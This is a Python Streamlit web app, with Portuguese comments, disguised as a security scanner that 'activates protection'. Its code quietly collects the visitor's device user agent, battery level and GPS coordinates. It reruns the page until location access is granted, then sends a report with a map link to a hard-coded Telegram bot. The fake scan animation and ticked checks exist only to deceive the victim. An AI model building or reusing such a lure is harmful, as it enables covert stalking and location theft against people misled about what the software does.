import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- CONFIGURAÇÃO ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_tg(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Segurança Máxima", layout="centered")

# --- ESTILO LIMPO ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# --- CAPTURA DE DADOS (SEM KEYS QUE CAUSAM ERRO) ---
# Captura o modelo (UA) e bateria via JS
dispositivo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEV')
nivel_bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')

# O GPS é chamado sem nenhum parâmetro extra para evitar o TypeError
loc = get_geolocation() 

# --- INTERFACE ---
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
tela = st.empty()

if 'processando' not in st.session_state:
    st.session_state['processando'] = False

# Estado inicial: 4%
if not st.session_state['processando']:
    with tela.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# --- LÓGICA DE 1 CLIQUE ---
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['processando'] = True

if st.session_state['processando']:
    with tela.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
    
    if loc and 'coords' in loc:
        # Se os dados chegaram, faz a animação final e envia
        for p in [25, 50, 75, 100]:
            tela.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.1)
        
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA\n\n"
            f"📱 Celular: {dispositivo[:50] if dispositivo else 'Desconhecido'}\n"
            f"🔋 Bateria: {nivel_bat if nivel_bat else '--'}%\n"
            f"📍 [VER LOCALIZAÇÃO]({mapa})"
        )
        
        enviar_tg(relatorio)
        st.success("✅ Proteção Ativada!")
        st.session_state['processando'] = False
        st.stop()
    else:
        # Se o GPS ainda não carregou, ele avisa e o Streamlit recarrega sozinho até pegar
        st.warning("⚠️ Aguardando GPS... Certifique-se de que a localização está ativa.")
        time.sleep(2)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
